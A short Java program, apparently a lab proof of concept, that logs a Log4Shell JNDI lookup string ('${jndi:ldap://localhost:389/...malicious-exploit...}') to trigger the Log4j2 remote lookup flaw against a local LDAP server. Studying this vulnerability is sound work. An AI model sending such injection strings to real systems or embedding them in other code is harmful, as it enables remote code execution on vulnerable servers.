package attaquant.v2;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class Log4j2Lookup {

    private static final Logger logger = LogManager.getLogger();

    public static void main(String[] args) {
        logger.info("hello");
        logger.info("${jndi:ldap://localhost:389/cn=malicious-exploit,dc=brochain}");
    }
}
